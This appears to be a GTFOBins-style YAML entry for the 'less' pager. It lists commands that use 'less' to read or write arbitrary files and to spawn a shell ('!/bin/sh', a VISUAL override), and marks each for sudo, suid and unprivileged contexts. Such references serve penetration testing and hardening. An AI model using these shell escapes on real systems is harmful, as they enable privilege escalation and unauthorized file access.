---
functions:
  file-read:
  - code: |-
      less /path/to/input-file
    contexts:
      sudo:
      suid:
      unprivileged:
  - code: |-
      less /etc/hosts
      :e /path/to/input-file
    comment: |-
      This can be used to read another file, e.g., when invoked as a pager with some fixed content.
    contexts:
      sudo:
      suid:
      unprivileged:
  file-write:
  - code: |-
      echo DATA | less
      s/path/to/output-file
      q
    contexts:
      sudo:
      suid:
      unprivileged:
  inherit:
  - code: |-
      less /etc/hosts
      v
    contexts:
      sudo:
      suid:
      unprivileged:
    from: vi
  shell:
  - code: |-
      less /etc/hosts
      !/bin/sh
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
  - code: |-
      VISUAL='/bin/sh -s --' less /etc/hosts
      v
    contexts:
      sudo:
      suid:
        shell: true
      unprivileged:
...
